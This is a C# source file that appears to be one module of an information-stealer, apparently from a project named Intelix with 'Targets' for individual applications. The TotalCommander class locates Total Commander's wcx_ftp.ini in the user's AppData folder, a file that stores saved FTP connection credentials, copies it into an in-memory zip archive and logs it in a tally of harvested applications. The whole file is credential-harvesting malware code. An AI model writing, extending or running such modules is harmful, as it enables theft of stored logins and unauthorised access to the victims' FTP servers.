using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications;

public class TotalCommander : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
		if (File.Exists(text))
		{
			string text2 = "Total Commander\\wcx_ftp.ini";
			zip.AddFile(text2, File.ReadAllBytes(text));
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Total Commander";
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Applications.Add(counterApplications);
		}
	}
}
